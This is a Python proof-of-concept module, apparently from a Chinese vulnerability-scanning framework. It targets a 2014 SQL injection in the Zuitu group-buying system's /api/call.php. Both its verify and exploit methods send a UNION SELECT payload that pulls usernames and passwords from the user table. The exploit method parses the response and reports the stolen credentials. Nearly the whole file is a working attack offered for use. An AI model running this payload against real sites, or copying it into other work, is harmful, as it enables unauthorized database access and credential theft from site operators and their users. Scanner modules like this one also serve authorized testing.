# coding: utf-8
import re
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'Zuitu_0102'  # 平台漏洞编号，留空
    name = '最土团购 /api/call.php SQL注入'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.INJECTION  # 漏洞类型
    disclosure_date = '2014-10-03'  # 漏洞公布时间
    desc = '''
        最土团购系统是国内最专业、功能最强大的GroupOn模式的免费开源团购系统平台，专业技术团队、完美用户体验与极佳的性能，立足为用户提供最值得信赖的免费开源网上团购系统。
        最土团购 /api/call.php SQL注入。
    '''  # 漏洞描述
    ref = 'http://www.moonsec.com/post-11.html'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'Zuitu(最土团购)'  # 漏洞应用名称
    product_version = 'Unknown'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = 'fa3c7d00-8012-41b6-8e59-ca79c0a970ed'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/api/call.php?action=query&num=11%27%29/**/union/**/select/**/1,2,3,"
                       "concat%280x7e,0x27,username,0x7e,0x27,password%29,5,6,7,8,9,10,11,12,13,"
                       "14,15,16/**/from/**/user/**/limit/**/0,1%23")
            verify_url = self.target + payload
            content = urllib.request.urlopen(
                urllib.request.Request(verify_url)).read()
            pattern = re.compile(r".*?<id>\\s*~'\\s*(?P<username>[^~]+)\\s*~'\\s*(?P<password>[\\w]+)\\s*</id>",
                                 re.I | re.S)  # \u5ffd\u7565\u5927\u5c0f\u5199\u3001\u5355\u884c\u6a21\u5f0f
            match = pattern.match(content)
            if match == None:
                return
            self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                target=self.target, name=self.vuln.name))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            payload = ("/api/call.php?action=query&num=11%27%29/**/union/**/select/**/1,2,3,"
                       "concat%280x7e,0x27,username,0x7e,0x27,password%29,5,6,7,8,9,10,11,12,13,"
                       "14,15,16/**/from/**/user/**/limit/**/0,1%23")
            verify_url = self.target + payload
            content = urllib.request.urlopen(
                urllib.request.Request(verify_url)).read()
            pattern = re.compile(r".*?<id>\\s*~'\\s*(?P<username>[^~]+)\\s*~'\\s*(?P<password>[\\w]+)\\s*</id>",
                                 re.I | re.S)  # \u5ffd\u7565\u5927\u5c0f\u5199\u3001\u5355\u884c\u6a21\u5f0f
            match = pattern.match(content)
            if match == None:
                return
            username = match.group("username")
            password = match.group("password")
            self.output.report(self.vuln, '发现{target}存在{name}漏洞;Username={username},Password={password}'.format(
                target=self.target, name=self.vuln.name, username=username, password=password))

        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
